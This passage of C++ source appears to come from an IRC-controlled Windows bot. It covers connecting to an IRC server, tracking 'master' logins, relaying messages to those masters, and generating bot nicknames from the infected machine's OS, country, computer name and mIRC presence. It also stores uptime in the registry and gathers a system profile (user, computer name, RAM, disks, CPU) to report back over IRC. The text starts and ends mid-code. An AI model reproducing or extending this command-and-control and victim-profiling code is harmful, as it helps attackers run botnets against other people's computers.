	strcpy(ntbuffer,tbuffer);
	for (unsigned int i=strlen(ntbuffer);i>strlen(ntbuffer)-2;i--)
		if (ntbuffer[i]=='\r' || ntbuffer[i]=='\n')
		{
			ntbuffer[i]=0;
		}
	printf("(out) %s\n",ntbuffer);
	DbgPrintFile("(out) %s\n",ntbuffer);
#endif // _DEBUG

#ifndef NO_OPENSSL
	if (servers[curserver].usessl)
	{
		if (ssl_socket.Write(tbuffer, strlen(tbuffer))<strlen(tbuffer))
		{
			//m_bJoined=false;
			connected=false;
			fclosesocket(irc_socket);
			irc_socket=INVALID_SOCKET;
			clear_logins();
			return 0;
		}
		else
			return 1;
	}
	else
	{
#endif
		if (fsend(socket,tbuffer,strlen(tbuffer),0)==SOCKET_ERROR)
			return 1;
		else
			return 0;
#ifndef NO_OPENSSL
	}
#endif
}

/////////////////////////////////////////////////////////////////////////////insert_irc_command_hook
void IRC::insert_irc_command_hook(irc_command_hook* hook, char* cmd_name, int (*function_ptr)(char*, irc_reply_data*, void*))
{
	if (hook->function)
	{
		if (!hook->next)
		{
			hook->next=new irc_command_hook;
			hook->next->function=0;
			hook->next->irc_command=0;
			hook->next->next=0;
		}
		insert_irc_command_hook(hook->next, cmd_name, function_ptr);
	}
	else
	{
		hook->function=function_ptr;
		hook->irc_command=new char[strlen(cmd_name)+1];
		strcpy(hook->irc_command, cmd_name);
	}
}

/////////////////////////////////////////////////////////////////////////////hook_irc_command
void IRC::hook_irc_command(char* cmd_name, int (*function_ptr)(char*, irc_reply_data*, void*))
{
	if (!hooks)
	{
		hooks=new irc_command_hook;
		hooks->function=0;
		hooks->irc_command=0;
		hooks->next=0;
		insert_irc_command_hook(hooks, cmd_name, function_ptr);
	}
	else
	{
		insert_irc_command_hook(hooks, cmd_name, function_ptr);
	}
}

/////////////////////////////////////////////////////////////////////////////delete_irc_command_hook
void IRC::delete_irc_command_hook(irc_command_hook* cmd_hook)
{
	if (cmd_hook->next)
		delete_irc_command_hook(cmd_hook->next);
	if (cmd_hook->irc_command)
		delete cmd_hook->irc_command;
	delete cmd_hook;
}

/////////////////////////////////////////////////////////////////////////////add_login
int IRC::add_login(const char* nick, const char* ident, const char* host)
{
	int i;
	BOOL s=FALSE;
	for (i=0; i<MAX_LOGINS; i++)
	{
		if (logins[i].nick[0] == '\0')
		{
			strcpy(logins[i].nick, nick);
			strcpy(logins[i].ident,ident);
			strcpy(logins[i].host, host);
			s=TRUE;
			break;
		}
	}

	if (s)
		return i;
	else
		return -1;
}

/////////////////////////////////////////////////////////////////////////////del_login
int IRC::del_login(const char* nick, const char* ident, const char* host)
{
	int i;
	BOOL bs=FALSE;
	for (i=0; i<MAX_LOGINS; i++)
	{
		if (logins[i].nick[0] != '\0')
		{
			if (!strcmp(logins[i].nick,nick) && !strcmp(logins[i].ident,ident) && !strcmp(logins[i].host,host))
			{
				bs=TRUE;
				del_login(i);
				break;
			}
		}
	}
	if (bs)
		return i;
	else
		return -1;
}

/////////////////////////////////////////////////////////////////////////////clear_logins
void IRC::clear_logins(void)
{
	for (int i=0; i<MAX_LOGINS; i++)
	{
		ZeroMemory(logins[i].nick,sizeof(logins[i].nick));
		ZeroMemory(logins[i].ident,sizeof(logins[i].ident));
		ZeroMemory(logins[i].host,sizeof(logins[i].host));
	}
}

/////////////////////////////////////////////////////////////////////////////del_login
BOOL IRC::del_login(int i)
{
	if (logins[i].nick[0]!='\0')
	{
		ZeroMemory(logins[i].nick,sizeof(logins[i].nick));
		ZeroMemory(logins[i].ident,sizeof(logins[i].ident));
		ZeroMemory(logins[i].host,sizeof(logins[i].host));
		return TRUE;
	}
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////is_logged_in
BOOL IRC::is_logged_in(const char* nick, const char* ident, const char* host)
{
	for (int i=0; i<MAX_LOGINS; i++)
		if (logins[i].nick[0] != '\0')
			if (!strcmp(logins[i].nick,nick) && !strcmp(logins[i].ident,ident) && !strcmp(logins[i].host,host))
				return TRUE;
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////has_master
BOOL IRC::has_master(void)
{
	for (int i=0; i<MAX_LOGINS; i++)
		if (logins[i].nick[0] != '\0')
			return TRUE;
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////list_logins
void IRC::list_logins(char* target)
{
	privmsg(target,"%s Login List:", main_title);
	for (int i=0; i<MAX_LOGINS; i++)
	{
		if (logins[i].nick[0] != '\0')
			privmsg(target,"<%i> %s!%s@%s",i,logins[i].nick,logins[i].ident,logins[i].host);
		else
			privmsg(target,"<%i> <Empty>",i);
	}
	privmsg(target,"%s Login List complete.", main_title);
	return;
}

/////////////////////////////////////////////////////////////////////////////notice_masters
int IRC::notice_masters(char* message, ...)
{
	if (!connected)
		return 1;
	
	int i,iret=0;
	char tbuffer[IRCLINE];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	
	for (i=0;i<MAX_LOGINS;i++)
		if (logins[i].nick[0]!='\0')
			iret+=notice(logins[i].nick,tbuffer);

	return iret;
}

/////////////////////////////////////////////////////////////////////////////privmsg_masters
int IRC::privmsg_masters(char* message, ...)
{
	if (!connected)
		return 1;
	
	int i,iret=0;
	char tbuffer[IRCLINE];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	
	for (i=0;i<MAX_LOGINS;i++)
		if (logins[i].nick[0]!='\0')
			iret+=privmsg(logins[i].nick,tbuffer);

	return iret;
}

/////////////////////////////////////////////////////////////////////////////start
int IRC::start(char* server, int port, char* nick, char* user, char* name, char* pass)
{
	HOSTENT* resolv;
	sockaddr_in rem;

	if (connected)
		return 1;

#ifndef NO_CONNCHECK
	BOOL bHasInet=FALSE;
	DWORD dwCStat;
	if (!nowininet) 
		while (!bHasInet)
			if ((bHasInet=fInternetGetConnectedState(&dwCStat,0))==FALSE)
				Sleep(30000);
#endif // NO_CONNCHECK

#ifdef NO_OPENSSL
#ifdef _DEBUG
	if (servers[curserver].usessl)
		printf("WARNING: SSL Server enabled with SSL disabled.\n");
#endif
#endif

	irc_socket=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (irc_socket==INVALID_SOCKET)
	{
		return 1;
	}
	resolv=fgethostbyname(server);
	if (!resolv)
	{
		fclosesocket(irc_socket);
		return 1;
	}
	memcpy(&rem.sin_addr, resolv->h_addr, 4);
	rem.sin_family=AF_INET;
	rem.sin_port=fhtons(port);

	if (fconnect(irc_socket, (const sockaddr*)&rem, sizeof(rem))==SOCKET_ERROR)
	{
#ifdef _DEBUG
		printf("Failed to connect: %d\n",fWSAGetLastError());
#endif // _DEBUG
		fclosesocket(irc_socket);
		return 1;
	}
	dwLastRecv=GetTickCount();

#ifndef NO_OPENSSL
	if(servers[curserver].usessl)
	{
#ifdef _DEBUG
		printf("Starting SSL socket...\n");
#endif
		ssl_socket.AttachToSocket(irc_socket);

#ifdef _DEBUG
		printf("Doing SSL handshake...\n");
#endif

		if(!ssl_socket.Connect())
		{
#ifdef _DEBUG
			printf("SSL handshake failed...\n");
#endif
			fclosesocket(irc_socket);
			connected=false;
			return 1;
		}
	}
#endif // NO_OPENSSL


	clear_logins();
	dwconnected=GetTickCount();
	dwLastRecv=GetTickCount();
	connected=true;
	
	cur_nick=new char[strlen(nick)+1];
	strcpy(cur_nick, nick);

	if (pass && strcmp(pass,""))
		isend(irc_socket,"PASS %s\r\n", pass);
	isend(irc_socket,"NICK %s\r\n", nick);
	isend(irc_socket,"USER %s * 0 :%s\r\n", user, name);
	dwLastRecv=GetTickCount();

	return 0;
}

/////////////////////////////////////////////////////////////////////////////disconnect
void IRC::disconnect()
{
	if (connected)
	{
#ifdef _DEBUG
		printf("Disconnected from server. (Manual)\n");
#endif // _DEBUG
		quit("Leaving");
		connected=false;
		bconnect=false;
		fshutdown(irc_socket, 2);
		fclosesocket(irc_socket);
	}
}

/////////////////////////////////////////////////////////////////////////////quit
int IRC::quit(char* quit_message, ...)
{
	if (connected)
	{
		int iret=0;
		if (quit_message)
		{
			char tbuffer[IRCLINE];

			va_list argp;
			va_start(argp,quit_message); 
			_vsnprintf(tbuffer,sizeof(tbuffer),quit_message,argp);

			iret=isend(irc_socket,"QUIT %s\r\n", tbuffer);
		}
		else
		{
			iret=isend(irc_socket,"QUIT\r\n");
		}
		if (iret)
			return 1;
	}
	return 0;
}

/////////////////////////////////////////////////////////////////////////////message_loop
int IRC::message_loop()
{
	char buffer[1024];
	int ret_len;

	if (!connected)
		return 1;

	while (1)
	{
		// Wait for a complete line to be received
		bool bRecvd=false;
#ifndef NO_OPENSSL
		if(servers[curserver].usessl)
			ret_len=ssl_socket.Read(&buffer,1023);
		else
#endif
			ret_len=frecv(irc_socket, buffer, 1023, 0);

//		ret_len=frecv(irc_socket, buffer, 1023, 0);
		if (ret_len==SOCKET_ERROR || !ret_len)
		{
			connected=false;
			return 1;
		}
		dwLastRecv=GetTickCount();
		buffer[ret_len]='\0';
		split_to_replies(buffer);
	}

	return 0;
}

/////////////////////////////////////////////////////////////////////////////split_to_replies
void IRC::split_to_replies(char* data)
{
	char* p;

	while (p=strstr(data, "\r\n"))
	{
		*p='\0';
		parse_irc_reply(data);
		data=p+2;
	}
}

/////////////////////////////////////////////////////////////////////////////parse_irc_reply
void IRC::parse_irc_reply(char* data)
{
	char* hostd;
	char* cmd;
	char* params;
	irc_reply_data hostd_tmp;

	hostd_tmp.target=0;

#ifdef _DEBUG
	char ntbuffer[IRCLINE];
	strcpy(ntbuffer,data);
	for (unsigned int i=strlen(ntbuffer);i>strlen(ntbuffer)-2;i--)
		if (ntbuffer[i]=='\r' || ntbuffer[i]=='\n')
		{
			ntbuffer[i]=0;
		}
	printf("(in)  %s\n",ntbuffer);
	DbgPrintFile("(in)  %s\n",ntbuffer);
#endif // _DEBUG
	
	if (data[0]==':')
	{
		hostd=&data[1];
		cmd=strchr(hostd, ' ');
		if (!cmd)
			return;
		*cmd='\0';
		cmd++;
		params=strchr(cmd, ' ');
		if (params)
		{
			*params='\0';
			params++;
		}
		hostd_tmp.nick=hostd;
		hostd_tmp.ident=strchr(hostd, '!');
		if (hostd_tmp.ident)
		{
			*hostd_tmp.ident='\0';
			hostd_tmp.ident++;
			hostd_tmp.host=strchr(hostd_tmp.ident, '@');
			if (hostd_tmp.host)
			{
				*hostd_tmp.host='\0';
				hostd_tmp.host++;
			}
		}

		if (!strcmp(cmd, "JOIN"))
		{
			
		}
		else if (!strcmp(cmd, "PART"))
		{
			if (is_logged_in(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host))
				del_login(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host);
		}
		else if (!strcmp(cmd, "QUIT"))
		{
			if (is_logged_in(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host))
				del_login(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host);
		}
//		else if (!strcmp(cmd, "MODE"))
//		{
//
//		}
//		else if (!strcmp(cmd, "353")) // Receiving channel user list (/names)
//		{
//
//		}
		else if (!strcmp(cmd, "NOTICE"))
		{
			hostd_tmp.target=params;
			params=strchr(hostd_tmp.target, ' ');
			if (params)
				*params='\0';
			params++;
		}
		else if (!strcmp(cmd, "PRIVMSG"))
		{
			hostd_tmp.target=params;
			params=strchr(hostd_tmp.target, ' ');
			if (!params)
				return;
			*(params++)='\0';
		}
		else if (!strcmp(cmd, "NICK"))
		{
			if (!strcmp(hostd_tmp.nick, cur_nick))
			{
				delete [] cur_nick;
				cur_nick=new char[strlen(params)+1];
				strcpy(cur_nick, params);
			}
		}
		/* else if (!strcmp(cmd, ""))
		{
		} */
		call_hook(cmd, params, &hostd_tmp);
	}
	else
	{
		cmd=data;
		data=strchr(cmd, ' ');
		if (!data)
			return;
		*data='\0';
		params=data+1;

		if (!strcmp(cmd, "PING"))
		{
			if (!params)
				return;

			isend(irc_socket,"PONG %s\r\n", &params[1]);
		}
		else
		{
			hostd_tmp.host=0;
			hostd_tmp.ident=0;
			hostd_tmp.nick=0;
			hostd_tmp.target=0;
			call_hook(cmd, params, &hostd_tmp);
		}
	}
}

/////////////////////////////////////////////////////////////////////////////call_hook
void IRC::call_hook(char* irc_command, char* params, irc_reply_data* hostd)
{
	irc_command_hook* p;

	if (!hooks)
		return;

	p=hooks;
	while (p)
	{
		if (!strcmp(p->irc_command, irc_command))
		{
			(*(p->function))(params, hostd, this);
			p=0;
		}
		else
		{
			p=p->next;
		}
	}
}

/////////////////////////////////////////////////////////////////////////////notice
int IRC::notice(char* target, char* message, ...)
{
	if (!connected)
		return 1;
	
	char tbuffer[IRCLINE];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	
	int iret=isend(irc_socket,"NOTICE %s :%s\r\n", target, tbuffer);
	Sleep(FLOOD_DELAY);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////privmsg
int IRC::privmsg(char* target, char* message, ...)
{
	if (!connected)
		return 1;
	
	char tbuffer[(IRCLINE-(MAX_NICKLEN+10))];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	
	int iret=isend(irc_socket,"PRIVMSG %s :%s\r\n", target, tbuffer);
	Sleep(FLOOD_DELAY);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////privmsg_filter
int IRC::privmsg_filter(char* target, char *filter, char* message, ...)
{
	if (!connected)
		return 1;
	
	char tbuffer[(IRCLINE-(MAX_NICKLEN+10))];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	
	if (filter)
		if (!wildcardfit(_strlwr(filter),_strlwr(tbuffer)))
			return 1;
	int iret=isend(irc_socket,"PRIVMSG %s :%s\r\n", target, tbuffer);
	Sleep(FLOOD_DELAY);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////join
int IRC::join(char* channel)
{
	if (!connected)
		return 1;
	int iret=isend(irc_socket,"JOIN %s\r\n", channel);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////join
int IRC::join(char* channel, char* pass)
{
	if (!connected)
		return 1;
	int iret=isend(irc_socket,"JOIN %s %s\r\n", channel, pass);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////part
int IRC::part(char* channel)
{
	if (!connected)
		return 1;
	int iret=isend(irc_socket,"PART %s\r\n", channel);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////kick
int IRC::kick(char* channel, char* nick)
{
	if (!connected)
		return 1;
	int iret=isend(irc_socket,"KICK %s %s\r\n", channel, nick);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////raw
int IRC::raw(char* data)
{
	if (!connected)
		return 1;
	int iret=isend(irc_socket,"%s\r\n", data);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////kick
int IRC::kick(char* channel, char* nick, char* message)
{
	if (!connected)
		return 1;
	int iret=isend(irc_socket,"KICK %s %s :%s\r\n", channel, nick, message);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////mode
int IRC::mode(char* channel, char* modes, char* targets)
{
	if (!connected)
		return 1;
	int iret;
	if (!targets)
		iret=isend(irc_socket,"MODE %s %s\r\n", channel, modes);
	else
		iret=isend(irc_socket,"MODE %s %s %s\r\n", channel, modes, targets);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////mode
int IRC::mode(char* modes)
{
	if (!connected)
		return 1;
	mode(cur_nick, modes, 0);
	return 0;
}

/////////////////////////////////////////////////////////////////////////////nickgen
char *IRC::nickgen(DWORD NickType, int NickLen)
{	
	static char *rndnick;
	nicklen=NickLen;

	if (NickType==N_OS)
		rndnick=nickgen_os();

	else if (NickType==N_RNDCTY)
		rndnick=nickgen_rndcountry();

	else if (NickType==N_BOX)
		rndnick=nickgen_curbox();

	else if (NickType==N_RNDLTR)
		rndnick=nickgen_rndltr();

	else if (NickType==N_MINE)
		rndnick=nickgen_mine();

	else
		rndnick=nickgen_rndltr();
	
	return rndnick;
}

/////////////////////////////////////////////////////////////////////////////nickgen_rndltr
char *IRC::nickgen_rndltr(void)
{	
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	
	for (int i=0;i<=nicklen;i++) 
		rndnick[i] = (rand()%26)+97;
	rndnick[i] = '\0';

	return rndnick;
}

/////////////////////////////////////////////////////////////////////////////nickgen_curbox
char *IRC::nickgen_curbox(void)
{
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	BOOL good=FALSE;
	
	DWORD dwcb=MAX_NICKLEN;
	fGetComputerName(rndnick,&dwcb);

	for (int j=65;j<91;j++) { if (rndnick[0] == j) good=TRUE; }
	for (int k=97;k<123;k++) { if (rndnick[0] == k) good=TRUE; }
	if (!good)
		sprintf(rndnick,"Error");
		
	return rndnick;
}


/////////////////////////////////////////////////////////////////////////////nickgen_rndcountry
char *IRC::nickgen_rndcountry(void)
{	
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	
	char locale[MAX_NICKLEN];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));

	sprintf(rndnick,"%s-",locale);
	
	for (int i=strlen(rndnick);i<=nicklen;i++) 
		rndnick[i]=(rand()%10)+48;

	return rndnick;
}

/////////////////////////////////////////////////////////////////////////////nickgen_os
char *IRC::nickgen_os(void)
{	
	char *os;
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);

	OSVERSIONINFO osVI;
	osVI.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	if (GetVersionEx(&osVI)) {
			if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==0)
			{	if(osVI.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)		os="95-";
				if(osVI.dwPlatformId==VER_PLATFORM_WIN32_NT)			os="NT-"; }
			else if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==10)	os="98-";
			else if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==90)	os="ME-";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==0)	os="2K-";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==1)	os="XP-";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==2)	os="2K3-";
			else														os="WIN-";
		} else
			os="WIN-";

		sprintf(rndnick,os);
		for (int i=strlen(rndnick);i<=nicklen;i++)
			rndnick[i]=(rand()%10)+48;
	
	return rndnick;
}

/////////////////////////////////////////////////////////////////////////////nickgen_mine
char *IRC::nickgen_mine(void)
{
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);

	prefixmrc=FALSE;
	prefixprv=FALSE;
	prefixdialup=FALSE;
	char *prefix=nickgen_prefix();
	
	char locale[MAX_NICKLEN];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));

	strcat(rndnick,prefix);
	strcat(rndnick,locale);
	strcat(rndnick,"|");
	
	int i=1;
	if (prefixmrc) i++;
	if (prefixprv) i++;
	if (prefixdialup) i++;
	
	char strbuf[2];
	for (i;i<REQ_NICKLEN;i++)
	{
		sprintf(strbuf,"%i",rand()%10);
		strcat(rndnick,strbuf);
	}
	strcat(rndnick,"]");
	//rndnick[strlen(rndnick)]='\0';

	return rndnick;
}


char *IRC::nickgen_prefix(void)
{
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	char days[8];
	unsigned int ud=GetTickCount()/86400000;

	sprintf(rndnick,"[");

#ifndef NO_MIRCNICK
	if (fFindWindow("mIRC",0))
	{
		prefixmrc=TRUE;
		strcat(rndnick,"M");
	}
#endif

#ifndef NO_PRIVATENICK
	if (PrivateIP(inip))
	{
		prefixprv=TRUE;
		strcat(rndnick,"P");
	}
#endif

#ifndef NO_DIALUPNICK
	if (!nowininet)
	{
		DWORD n;
		fInternetGetConnectedStateEx(&n, 0, 0, 0);
		if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) {
			strcat(rndnick,"D");
			prefixdialup=TRUE;
		}
	}
#endif

	sprintf(days,"%.2d",ud);
	nicktime=ud;
	
	strcat(rndnick,days);
	strcat(rndnick,"|");
	return rndnick;
};

/////////////////////////////////////////////////////////////////////////////nick
int IRC::nick(char* newnick)
{
	if (!connected)
		return 1;
	int iret=isend(irc_socket,"NICK %s\r\n", newnick);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////current_nick
char* IRC::current_nick()
{
	return cur_nick;
}

/////////////////////////////////////////////////////////////////////////////is_connected
bool IRC::is_connected()
{
	return connected;
}

/////////////////////////////////////////////////////////////////////////////should_connect
bool IRC::should_connect()
{
	return bconnect;
}

char* IRC::get_ip()
{
	SOCKADDR sa;
	int sas = sizeof(sa);
	ZeroMemory(&sa,sizeof(sa));
	fgetsockname(irc_socket, &sa, &sas);
	sprintf(ip,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);
	return ip;
}

SOCKET IRC::get_sock(void)
{
	return irc_socket;
}



#ifndef NO_OPENSSL
CSSLSocket::CSSLSocket()
{
	m_psslCtx=NULL;
	m_pSSL=NULL;
	SSL_library_init();
	m_bConnected=FALSE;
}

CSSLSocket::~CSSLSocket()
{	// Cleanup
	if(m_psslCtx)
		SSL_CTX_free(m_psslCtx);
	if(m_pSSL)
	{
		SSL_shutdown(m_pSSL);
		SSL_free(m_pSSL);
	}
	m_bConnected=FALSE;
}

bool CSSLSocket::Init()
{	
	m_bConnected=FALSE;
	
	// Initialize the context, exit if fails
	m_psslCtx=SSL_CTX_new(SSLv3_method());	
	if(!m_psslCtx)
		return FALSE;

	// Initialize the object, exit if fails
	m_pSSL=SSL_new(m_psslCtx);
	if(!m_pSSL)
		return FALSE;

	// Success
	return TRUE;
}

bool CSSLSocket::AttachToSocket(int sSocket)
{
	m_bConnected=FALSE;

	// Fail if not initialized
	if(!m_psslCtx || !m_pSSL)
		return FALSE;

	// Store the socket, and attach it to the ssl object
	m_sSocket=sSocket;
	if(!SSL_set_fd(m_pSSL, m_sSocket))
		return FALSE;

	// Success
	return TRUE;
}

int CSSLSocket::GetSocket() {
	return m_sSocket;
}

bool CSSLSocket::Accept()
{
	m_bConnected=FALSE;

	// Fail if not initialized
	if(!m_psslCtx || !m_pSSL)
		return FALSE;

	if(SSL_accept(m_pSSL)==1)
	{
		m_bConnected=TRUE;
		return TRUE;
	}
	else
	{
		m_bConnected=FALSE;
		return FALSE;
	}
}

bool CSSLSocket::Connect()
{	
	m_bConnected=FALSE;
	
	// Fail if not initialized
	if(!m_psslCtx || !m_pSSL)
		return FALSE;

	if(SSL_connect(m_pSSL)==1)
	{
		m_bConnected=TRUE;
		return TRUE;
	}
	else
	{
		m_bConnected=FALSE;
		return FALSE;
	}
}

void CSSLSocket::Close()
{
	SSL_shutdown(m_pSSL);
	m_bConnected=FALSE;
}

int CSSLSocket::Read(void *pBuf, int iNum)
{
	if(!m_psslCtx || !m_pSSL || !m_bConnected)
		return 0;
	return SSL_read(m_pSSL, pBuf, iNum);
}

int CSSLSocket::Write(const void *pBuf, int iNum)
{
	if(!m_psslCtx || !m_pSSL || !m_bConnected)
		return 0;
	return SSL_write(m_pSSL, pBuf, iNum);
}
#endif


extern char netinfo_title[];
extern char sysinfo_title[];

char *Uptime(DWORD TickCount,DWORD Startup, BOOL vDays/*=FALSE*/)
{
	static char buffer[50];
	ZeroMemory(buffer,sizeof(buffer));

	DWORD dwTotal=(TickCount/1000)-(Startup/1000);
	DWORD dwDays=dwTotal/86400;
	DWORD dwHours=(dwTotal%86400)/3600;
	DWORD dwMins=((dwTotal%86400)%3600)/60;
	
	if (vDays || dwDays > 0)
		sprintf(buffer,"%d day%s %0.2d:%0.2d",dwDays,(dwDays==1?"":"s"),dwHours,dwMins);
	else
		sprintf(buffer,"%0.2d:%0.2d",dwHours,dwMins);

	return buffer;
}

#ifndef NO_RECORD_UPTIME
BOOL bRecUpdated;

char *RecordUptime(void)
{
	static char buffer[50];
	ZeroMemory(buffer,sizeof(buffer));

	DWORD dwTotal=GetRecord()/1000;
	if (dwTotal==0) {
		sprintf(buffer,"Error <%d>.",GetLastError());
		return buffer;
	}
	DWORD dwDays=dwTotal/86400;
	DWORD dwHours=(dwTotal%86400)/3600;
	DWORD dwMins=((dwTotal%86400)%3600)/60;

	sprintf(buffer,"%d day%s %0.2d:%0.2d",dwDays,(dwDays==1?"":"s"),dwHours,dwMins);
	return buffer;
}


BOOL UpdateRecord(void)
{
	BOOL bSuccess=FALSE;
	DWORD CurRecord;
	DWORD dwGTC=GetTickCount();
	if (!bRecUpdated)
	{	// If it hasnt been updated its worth checking again.
		CurRecord=RegQuery(rupkey.hkey,rupkey.subkey,rupkey.name,bSuccess);

		if (bSuccess)
		{
			if (dwGTC > CurRecord)
				if (RegWrite(rupkey.hkey,rupkey.subkey,rupkey.name,dwGTC))
					return TRUE;
		}
		else
		{
			if (RegWrite(rupkey.hkey,rupkey.subkey,rupkey.name,dwGTC))
				return TRUE;
		}
	}
	else
	{	// If its already been updated then it will keep updating so we can skip the query.
		RegWrite(rupkey.hkey,rupkey.subkey,rupkey.name,dwGTC);
		return TRUE;
	}
	return FALSE;
}

DWORD GetRecord(void)
{
	BOOL bSuccess=FALSE;
	DWORD CurRecord;
	CurRecord=RegQuery(rupkey.hkey,rupkey.subkey,rupkey.name,bSuccess);

	if (bSuccess)
		return CurRecord;
	else
		return 0;

	return 0;
}

DWORD WINAPI RecordUptimeThread(LPVOID param)
{
	bRecUpdated=FALSE;
	if (!noadvapi32) {
		while (1) {
			bRecUpdated=UpdateRecord();
			Sleep(RUPTIME_DELAY);
		}
	}
	ExitThread(0);
}
#endif //NO_RECORD_UPTIME




#ifndef NO_SYSINFO

// asm for cpuspeed() (used for counting cpu cycles)
#pragma warning( disable : 4035 )
inline unsigned __int64 GetCycleCount(void)
{
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
}
#pragma warning( default : 4035 )

// cpu speed function
unsigned __int64 GetCPUSpeed(void)
{
	unsigned __int64 startcycle, speed, num, num2;

	do {
		startcycle = GetCycleCount();
		Sleep(1000);
		speed = ((GetCycleCount()-startcycle)/1000000);
	} while (speed > 1000000);

	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return (speed);
}

// function used for sysinfo
void sysinfo(char *target, void* conn)
{
	IRC* irc=(IRC*)conn;
	char *os="???", os2[140];
	char sinfo[IRCLINE];
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2003";
	

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s (%s)", os, verinfo.szCSDVersion);
		os = os2;
	}

	DWORD dwcu=256;
	DWORD dwcb=256;
	char CurrentUser[256];
	char CurrentBox[256];
	fGetUserName(CurrentUser,&dwcu);
	fGetComputerName(CurrentBox,&dwcb);

	char sysdir[MAX_PATH];
    GetSystemDirectory(sysdir,sizeof(sysdir));

    char date[70], time[70];
    GetDateFormat(0x409,0,0,"dd:MMM:yyyy",date,70);
    GetTimeFormat(0x409,0,0,"HH:mm:ss",time,70);

	MEMORYSTATUS memstat;
	ZeroMemory(&memstat,sizeof(memstat));
	GlobalMemoryStatus(&memstat); // load memory info into memstat

//	char drive[10];
//	_splitpath(sysdir, drive, NULL, NULL, NULL);
//
	char mtotal[50],mavail[50];
	sprintf(mtotal,commaI64(memstat.dwTotalPhys/1024));
	sprintf(mavail,commaI64(memstat.dwAvailPhys/1024));

	__int64 tmpAvail=0;
	__int64 tmpFree=0;
	__int64 tmpTotal=0;
	
	DWORD dwSize = GetLogicalDriveStrings(0, NULL);
	LPSTR pszDrives = (LPSTR)malloc(dwSize + 2);
	GetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);
	LPCTSTR pszDrv = pszDrives;
	while (*pszDrv) {
		if (strcmp(pszDrv,"A:\\") != 0) {
			DKSPT dkspt;
			dkspt=DiskSpaceTotal(pszDrv, 1073741824);
			tmpAvail+=dkspt.AvailableT;
			tmpFree+=dkspt.FreeT;
			tmpTotal+=dkspt.TotalT;
		}
		pszDrv += _tcslen (pszDrv) + 1;
	}
	free(pszDrives);

	_snprintf(sinfo, IRCLINE, "%s [CPU]: %I64uMHz. [RAM]: %sKB total, %sKB free. [OS]: Windows %s (%d.%d - %d). [Sysdir]: %s. [Computer Name]: %s. [Current User]: %s. [Date]: %s. [Time]: %s. [Uptime]: %s. [Free Space]: %I64uGB/%I64uGB.",
